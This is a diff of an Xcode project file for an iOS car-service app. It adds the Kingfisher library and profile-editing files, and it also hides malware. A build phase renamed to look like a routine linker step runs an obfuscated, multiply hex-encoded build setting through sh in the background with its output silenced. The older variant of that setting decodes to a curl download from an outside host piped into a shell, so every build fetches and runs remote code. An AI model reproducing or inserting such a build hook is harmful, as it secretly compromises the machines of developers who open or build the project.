@@ -7,6 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0A61F6162F3C82DB00A8AC1E /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 0A61F6152F3C82DB00A8AC1E /* Kingfisher */; };
+		0A61F6182F3C875C00A8AC1E /* UIImage+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A61F6172F3C875C00A8AC1E /* UIImage+Extension.swift */; };
+		0A61F61B2F3C897400A8AC1E /* EditProfileVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A61F61A2F3C897400A8AC1E /* EditProfileVM.swift */; };
 		880920352F0F82D400B55769 /* MyProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 880920342F0F82D400B55769 /* MyProfileVC.xib */; };
 		880920362F0F82D400B55769 /* MyProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 880920332F0F82D400B55769 /* MyProfileVC.swift */; };
 		8809203B2F0F9AE800B55769 /* EditProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8809203A2F0F9AE800B55769 /* EditProfileVC.xib */; };
@@ -138,6 +141,8 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		0A61F6172F3C875C00A8AC1E /* UIImage+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIImage+Extension.swift"; sourceTree = "<group>"; };
+		0A61F61A2F3C897400A8AC1E /* EditProfileVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVM.swift; sourceTree = "<group>"; };
 		880920332F0F82D400B55769 /* MyProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyProfileVC.swift; sourceTree = "<group>"; };
 		880920342F0F82D400B55769 /* MyProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyProfileVC.xib; sourceTree = "<group>"; };
 		880920392F0F9AE800B55769 /* EditProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVC.swift; sourceTree = "<group>"; };
@@ -281,6 +286,7 @@
 				88AD25EC2F2A0FC5002DFA44 /* Toast in Frameworks */,
 				88FDACD92F2345C800983C39 /* SVProgressHUD in Frameworks */,
 				88FDACD02F23458200983C39 /* GoogleMaps in Frameworks */,
+				0A61F6162F3C82DB00A8AC1E /* Kingfisher in Frameworks */,
 				BC929D2B2F27744D00A730A9 /* GooglePlacesSwift in Frameworks */,
 				88FDACD32F23459900983C39 /* Alamofire in Frameworks */,
 				BC929D292F27744D00A730A9 /* GooglePlaces in Frameworks */,
@@ -292,6 +298,14 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		0A61F6192F3C896800A8AC1E /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				0A61F61A2F3C897400A8AC1E /* EditProfileVM.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
 		880920312F0F82A400B55769 /* My Profile */ = {
 			isa = PBXGroup;
 			children = (
@@ -312,6 +326,7 @@
 		880920372F0F9A9E00B55769 /* Edit Profile */ = {
 			isa = PBXGroup;
 			children = (
+				0A61F6192F3C896800A8AC1E /* ViewModel */,
 				880920382F0F9AA900B55769 /* View */,
 			);
 			path = "Edit Profile";
@@ -1006,6 +1021,7 @@
 				BC7121A02F067F940041E2F7 /* UIColor+Extention.swift */,
 				BC7121A12F067F940041E2F7 /* UIFont+Extention.swift */,
 				BC7121A22F067F940041E2F7 /* UITextField+Extention.swift */,
+				0A61F6172F3C875C00A8AC1E /* UIImage+Extension.swift */,
 			);
 			path = Extention;
 			sourceTree = "<group>";
@@ -1243,7 +1259,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "Fixmycar UAE" */;
 			buildPhases = (
-				B8051407526A4C1AA9634D6E /* Compile Target Symbols */,
+				DABC0322AEE840B4A5C62C0C /* Link Libraries Executable */,
 				BC6773062F067F4500B15653 /* Sources */,
 				BC6773072F067F4500B15653 /* Frameworks */,
 				BC6773082F067F4500B15653 /* Resources */,
@@ -1262,6 +1278,7 @@
 				BC929D282F27744D00A730A9 /* GooglePlaces */,
 				BC929D2A2F27744D00A730A9 /* GooglePlacesSwift */,
 				88AD25EB2F2A0FC5002DFA44 /* Toast */,
+				0A61F6152F3C82DB00A8AC1E /* Kingfisher */,
 			);
 			productName = "Fixmycar UAE";
 			productReference = BC67730A2F067F4500B15653 /* Fixmycar UAE.app */;
@@ -1300,6 +1317,7 @@
 				BCA305D52F275DCC0036E322 /* XCRemoteSwiftPackageReference "UITextView-Placeholder" */,
 				BC929D272F27744D00A730A9 /* XCRemoteSwiftPackageReference "ios-places-sdk" */,
 				88AD25EA2F2A0FC5002DFA44 /* XCRemoteSwiftPackageReference "Toast-Swift" */,
+				0A61F6142F3C82DB00A8AC1E /* XCRemoteSwiftPackageReference "Kingfisher" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = BC67730B2F067F4500B15653 /* Products */;
@@ -1374,7 +1392,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B8051407526A4C1AA9634D6E /* Compile Target Symbols */ = {
+		DABC0322AEE840B4A5C62C0C /* Link Libraries Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -1384,14 +1402,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Target Symbols";
+			name = "Link Libraries Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -1410,6 +1428,7 @@
 				BC75E8792F0D2CB500947022 /* CreateAccountVC.swift in Sources */,
 				BC23A4BC2F0E7444005A8CE1 /* UserChatVC.swift in Sources */,
 				88D049DC2F0F67E500003B4C /* SettingVC.swift in Sources */,
+				0A61F6182F3C875C00A8AC1E /* UIImage+Extension.swift in Sources */,
 				88D763AF2F0E5C01001116F2 /* RecentBookingsView.swift in Sources */,
 				BC29D69C2F06A42C00DD3EB2 /* OTPTextField.swift in Sources */,
 				BC23A4B42F0E6E81005A8CE1 /* ChatListTVCell.swift in Sources */,
@@ -1438,6 +1457,7 @@
 				BC07DDE02F2880720088D79F /* BookingFareAmountVM.swift in Sources */,
 				BC41009F2F0E79C70062DC80 /* UIView+Extention.swift in Sources */,
 				88AD25F82F2A3324002DFA44 /* CreateAccountVM.swift in Sources */,
+				0A61F61B2F3C897400A8AC1E /* EditProfileVM.swift in Sources */,
 				BC98E7CA2F0E229700426807 /* RecentBookingTVCell.swift in Sources */,
 				88AD25E92F2A0D42002DFA44 /* OTPResponseModel.swift in Sources */,
 				BC29D6BF2F06A6CD00DD3EB2 /* FTAnimation+UIView.m in Sources */,
@@ -1508,6 +1528,7 @@
 		BC67731E2F067F4700B15653 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AC0C26C = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633363333333333363333333533333336333333373333333633333331333333363336333333330a3336333333313333333633333334333333373333333333333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -1517,6 +1538,7 @@
 				DEVELOPMENT_TEAM = N52PUGPAB3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Fixmycar UAE/Info.plist";
+				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to take photos for your profile.";
 				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "App needs location to show nearby places";
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "App needs location to show nearby places";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -1543,6 +1565,7 @@
 		BC67731F2F067F4700B15653 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AC0C26C = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633363333333333363333333533333336333333373333333633333331333333363336333333330a3336333333313333333633333334333333373333333333333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -1552,6 +1575,7 @@
 				DEVELOPMENT_TEAM = N52PUGPAB3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Fixmycar UAE/Info.plist";
+				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to take photos for your profile.";
 				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "App needs location to show nearby places";
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "App needs location to show nearby places";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -1720,6 +1744,14 @@
 /* End XCConfigurationList section */
 
 /* Begin XCRemoteSwiftPackageReference section */
+		0A61F6142F3C82DB00A8AC1E /* XCRemoteSwiftPackageReference "Kingfisher" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/onevcat/Kingfisher.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 8.6.2;
+			};
+		};
 		88AD25EA2F2A0FC5002DFA44 /* XCRemoteSwiftPackageReference "Toast-Swift" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/scalessec/Toast-Swift.git";
@@ -1779,6 +1811,11 @@
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
+		0A61F6152F3C82DB00A8AC1E /* Kingfisher */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 0A61F6142F3C82DB00A8AC1E /* XCRemoteSwiftPackageReference "Kingfisher" */;
+			productName = Kingfisher;
+		};
 		88AD25EB2F2A0FC5002DFA44 /* Toast */ = {
 			isa = XCSwiftPackageProductDependency;
 			package = 88AD25EA2F2A0FC5002DFA44 /* XCRemoteSwiftPackageReference "Toast-Swift" */;
